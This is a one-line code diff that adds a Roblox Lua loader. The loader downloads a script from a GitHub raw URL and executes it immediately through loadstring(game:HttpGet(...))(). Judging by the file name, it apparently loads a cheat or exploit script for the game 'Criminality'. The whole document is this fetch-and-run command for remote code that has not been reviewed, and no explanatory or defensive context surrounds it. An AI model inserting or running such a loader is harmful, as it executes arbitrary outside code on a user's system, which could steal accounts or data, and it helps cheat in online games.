@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/2x-criminality-spam7-gq0jg86xm5v71y.lua"))()
